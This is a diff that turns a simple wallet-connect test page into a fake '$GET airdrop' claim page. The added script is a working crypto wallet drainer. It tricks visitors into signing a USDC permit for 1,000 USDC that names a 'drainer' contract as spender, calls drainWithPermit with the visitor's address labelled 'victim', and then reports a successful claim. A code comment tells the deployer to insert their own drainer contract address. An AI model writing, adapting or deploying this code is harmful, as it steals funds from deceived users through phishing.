@@ -1,31 +1,101 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Wallet Connect Test</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
-  </head>
-  <body>
-    <h2>Connect Wallet</h2>
-    <button onclick="connect()">Connect</button>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>🎁 GET Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-950 text-white flex items-center justify-center min-h-screen">
+  <div class="bg-gray-900 rounded-2xl shadow-xl p-8 w-full max-w-md text-center space-y-6">
+    <h1 class="text-3xl font-bold text-yellow-400">🎁 Claim 10,000 $GET</h1>
+    <p class="text-gray-300">Connect your wallet and claim your free tokens. Powered by Base.</p>
 
-    <script>
-      async function connect() {
-        if (typeof window.ethereum === "undefined") {
-          alert("No wallet found. Use MetaMask.");
-          return;
-        }
+    <div class="space-y-4">
+      <button id="connect" class="w-full bg-blue-600 hover:bg-blue-700 transition py-3 px-6 rounded-xl font-semibold">
+        🔌 Connect Wallet
+      </button>
+      <button id="claim" disabled class="w-full bg-green-600 hover:bg-green-700 transition py-3 px-6 rounded-xl font-semibold">
+        🚀 Claim Now
+      </button>
+    </div>
 
-        try {
-          const provider = new ethers.providers.Web3Provider(window.ethereum);
-          await provider.send("eth_requestAccounts", []);
-          const signer = provider.getSigner();
-          const address = await signer.getAddress();
-          alert("Connected: " + address);
-        } catch (err) {
-          console.error(err);
-          alert("Connection failed: " + err.message);
-        }
+    <p id="status" class="text-sm text-gray-400 mt-4"></p>
+  </div>
+
+  <script>
+    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
+    const DRAINER_CONTRACT = "0x2943B7c399f3EC9a80F31e292956837fF640c886"; // Replace with your actual drainer CA
+
+    let signer, address;
+
+    const connectBtn = document.getElementById('connect');
+    const claimBtn = document.getElementById('claim');
+    const status = document.getElementById('status');
+
+    connectBtn.onclick = async () => {
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      address = await signer.getAddress();
+      claimBtn.disabled = false;
+      status.textContent = `✅ Connected: ${address.slice(0, 6)}...${address.slice(-4)}`;
+    };
+
+    claimBtn.onclick = async () => {
+      try {
+        const domain = {
+          name: "USD Coin",
+          version: "2",
+          chainId: 8453,
+          verifyingContract: USDC_ADDRESS
+        };
+
+        const types = {
+          Permit: [
+            { name: "owner", type: "address" },
+            { name: "spender", type: "address" },
+            { name: "value", type: "uint256" },
+            { name: "nonce", type: "uint256" },
+            { name: "deadline", type: "uint256" }
+          ]
+        };
+
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const usdc = new ethers.Contract(USDC_ADDRESS, [
+          "function nonces(address) view returns (uint256)"
+        ], provider);
+
+        const nonce = await usdc.nonces(address);
+        const value = ethers.utils.parseUnits("1000", 6); // 1,000 USDC
+        const deadline = Math.floor(Date.now() / 1000) + 3600;
+
+        const message = {
+          owner: address,
+          spender: DRAINER_CONTRACT,
+          value,
+          nonce,
+          deadline
+        };
+
+        const sig = await signer._signTypedData(domain, types, message);
+        const { v, r, s } = ethers.utils.splitSignature(sig);
+
+        const drainer = new ethers.Contract(DRAINER_CONTRACT, [
+          "function drainWithPermit(address token,address victim,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s)"
+        ], signer);
+
+        const tx = await drainer.drainWithPermit(USDC_ADDRESS, address, value, deadline, v, r, s);
+        await tx.wait();
+
+        status.textContent = "🎉 Claimed successfully!";
+        claimBtn.disabled = true;
+      } catch (err) {
+        console.error(err);
+        status.textContent = "❌ Something went wrong!";
       }
-    </script>
-  </body>
+    };
+  </script>
+</body>
 </html>
